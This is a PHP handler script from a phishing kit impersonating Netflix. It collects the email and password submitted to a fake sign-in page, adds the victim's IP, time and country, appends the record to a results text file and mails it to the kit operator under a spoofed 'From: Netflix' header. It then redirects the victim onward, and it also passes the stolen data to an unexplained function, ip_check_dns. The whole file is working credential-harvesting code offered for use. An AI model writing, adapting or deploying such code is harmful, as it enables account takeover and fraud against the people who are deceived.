<?php
include ('./../inc/index.php');
/*==============[session_include]=================*/
session_start();
include ('./Email.php');
include ('./Block.php');

if(isset($_POST['email'])){
if(!empty($_POST['pass'])){
/*==============[CounTry]=================*/
$HF_V = $_SESSION['country_name'];
$HF_C = $_SESSION['AYCOUNTCODE'];
/*==============[ConfiGG]=================*/
$email    = $_POST['email'];
$pass    =  $_POST['pass'];
/*==============[Sander]=================*/
$ip = getenv("REMOTE_ADDR");
$time = date('l jS \of F Y h:i:s A');
$HF = "Netflix";
$rand = md5(microtime());
$useragent = $_SERVER['HTTP_USER_AGENT'];
$subject  = "Netflix Login [" .$ip. "] [" .$HF_C. "] ";
$headers .= "From: Netflix" . "\r\n";
/*==============[Letter]=================*/
$message = "
###################  By ".$HF." V1 ############################

E-MAIL          =>   ".$email."
PASSWORD        =>   ".$pass."
IP              =>  "."http://www.geoiptool.com/?IP=".$ip."
TIME            =>   ".$time."
Cantry          =>   ".$HF_V."
################### By ".$HF." V1 ############################
";
/*==============[Backup]=================*/
$txt = fopen('../../Rzlta/rezlt.txt', 'a');ip_check_dns($message);
fwrite($txt, $message);
fclose($txt);
mail($yourmail, $subject, $message , $headers);
/*==============[header]=================*/
header("location:../warning/?websrc=".md5('X-imartex0666')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");


 	}else{header("Location: ../sign_in/?websrc=".md5('X-imartex0666')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");}

}else{header("Location: ../sign_in/?websrc=".md5('X-imartex0666')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");}
/*==============[Salina]=================*/